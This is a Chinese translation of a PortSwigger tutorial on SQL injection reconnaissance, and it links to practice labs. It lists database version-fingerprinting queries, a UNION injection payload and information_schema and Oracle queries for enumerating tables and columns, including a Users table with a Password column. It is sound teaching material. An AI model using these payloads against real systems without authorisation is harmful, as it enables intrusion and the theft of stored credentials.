---
description: '原文链接：https://portswigger.net/web-security/sql-injection/examining-the-database'
---

# 在SQL注入攻击中检查数据库

当利用 [SQL 注入](https://portswigger.net/web-security/sql-injection)漏洞时，收集数据库本身的信息通常是必要的。这包括数据库软件的类型和版本，还包括数据库中包含的表和列等内容。

### 查询数据库类型和版本

不同的数据库提供不同的版本查询方式。我们通常需要在多种查询方式中尝试，找出可以让我们确定数据库软件类型和版本的那一种方法。

主流数据库提供如下方式来确定数据库版本：

```text
Database type      |   Query
----------------------------------------
Microsoft, MySQL   |   SELECT @@version
Oracle             |   SELECT * FROM v$version
PostgreSQL     |   SELECT version()
```

例如，可以在 UNION 注入攻击中利用如下 payload:

```text
' UNION SELECT @@version--
```

我们可能得到如下结果，从而确定数据库类型为 Microsoft SQL Server ，版本信息为：

```text
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

{% hint style="warning" %}
**实验：**[SQL注入攻击，在Oracle中查询数据库类型和版本](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
{% endhint %}

{% hint style="warning" %}
**实验：**[SQL注入攻击，在MySQL和微软中查询数据库类型和版本](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
{% endhint %}

### 列出数据库的内容

大多数数据类型，都有一组被称作 information schema 的视图，这些视图提供有关数据库的信息。

我们可以通过查询 information\_schema.tables 列出数据库的表：

```text
SELECT * FROM information_schema.tables
```

返回如下：

```text
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME    TABLE_TYPE
=====================================================
MyDatabase    dbo          Products BASE TABLE
MyDatabase    dbo          Users BASE    TABLE
MyDatabase    dbo          Feedback BASE TABLE
```

这些返回结果表明，库中有三个表，分别是 Products, Users, Feedback。

我们可以通过查询 information\_schema.columns 列出特定表中的列：

```text
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

返回如下：

```text
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
=================================================================
MyDatabase    dbo          Users      UserId      int
MyDatabase    dbo          Users      Username    varchar
MyDatabase    dbo          Users      Password    varchar
```

此输出显示了指定表中的列以及每列的数据类型。

{% hint style="warning" %}
**实验：**[SQL注入攻击，在非Oracle数据库中列出数据库内容](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
{% endhint %}

### 等效于Oracle中的information schema

在 Oracle 中，我们可以通过稍有差异的查询语句获取同样的信息。

我们可以通过查询 all\_tables 列出表：

```text
SELECT * FROM all_tables
```

可以通过查询 all\_tab\_columns 列出列：

```text
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

{% hint style="warning" %}
实验：[SQL注入攻击，在Oracle中列出数据库内容](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
{% endhint %}

